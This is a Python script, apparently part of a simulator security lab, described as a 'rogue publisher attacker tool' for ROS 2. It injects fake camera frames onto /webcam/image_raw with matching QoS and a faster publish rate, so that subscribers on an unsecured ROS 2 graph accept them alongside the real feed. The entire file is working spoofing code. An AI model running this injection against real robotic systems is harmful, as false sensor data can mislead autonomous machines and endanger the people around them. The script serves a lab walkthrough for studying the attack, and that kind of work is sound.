#!/usr/bin/env python3
"""ROS 2 rogue publisher attacker tool.

Publishes synthetic frames onto /webcam/image_raw at the same QoS profile
as the legitimate gazebo_ros camera plugin (SensorData: KEEP_LAST,
BEST_EFFORT). Any subscriber that does not authenticate participants
(i.e. the default, unsecured ROS 2 graph) will accept the injected
frames interleaved with the legitimate ones.

This script is the payload for the "ROS 2 Rogue Publisher Injection"
attack scenario walkthrough — see the same directory for the YAML.

Usage (inside an attacker container on the simulator network, with
ROS_DOMAIN_ID=42 and Cyclone DDS configured to peer with 10.13.0.3 and
10.13.0.5):

    python3 ros2_rogue_publisher.py
"""
import struct

import rclpy
from rclpy.node import Node
from rclpy.qos import qos_profile_sensor_data
from sensor_msgs.msg import Image


WIDTH = 640
HEIGHT = 480
PUBLISH_RATE_HZ = 15.0  # slightly above the legit publisher (10 Hz)


def make_payload() -> bytes:
    """Return a solid-red BGR8 buffer with a visible bar pattern.

    A real attacker would render text/imagery; this is deliberately the
    simplest thing that's visually distinguishable on the RTSP stream.
    """
    # BGR8: blue, green, red. Red is index 2.
    row = bytearray(WIDTH * 3)
    for x in range(WIDTH):
        # Vertical bars so frame-to-frame difference is obvious
        if (x // 40) % 2 == 0:
            row[x * 3 + 0] = 0
            row[x * 3 + 1] = 0
            row[x * 3 + 2] = 255  # red
        else:
            row[x * 3 + 0] = 0
            row[x * 3 + 1] = 0
            row[x * 3 + 2] = 80   # dark red
    return bytes(row) * HEIGHT


class RoguePublisher(Node):
    def __init__(self):
        super().__init__('rogue_camera_publisher')
        # QoS MUST match the legitimate publisher's profile or the legit
        # subscribers will silently drop our messages.
        self.pub = self.create_publisher(
            Image, '/webcam/image_raw', qos_profile_sensor_data
        )
        self.timer = self.create_timer(1.0 / PUBLISH_RATE_HZ, self._publish)
        self._payload = make_payload()
        self._counter = 0
        self.get_logger().info(
            f'Rogue publisher up. Publishing {WIDTH}x{HEIGHT} BGR8 frames '
            f'at {PUBLISH_RATE_HZ} Hz to /webcam/image_raw.'
        )

    def _publish(self):
        msg = Image()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = 'camera_link'
        msg.height = HEIGHT
        msg.width = WIDTH
        msg.encoding = 'bgr8'
        msg.is_bigendian = 0
        msg.step = WIDTH * 3
        msg.data = self._payload
        self.pub.publish(msg)
        self._counter += 1
        if self._counter % int(PUBLISH_RATE_HZ * 5) == 0:
            self.get_logger().info(f'Sent {self._counter} rogue frames.')


def main():
    rclpy.init()
    node = RoguePublisher()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
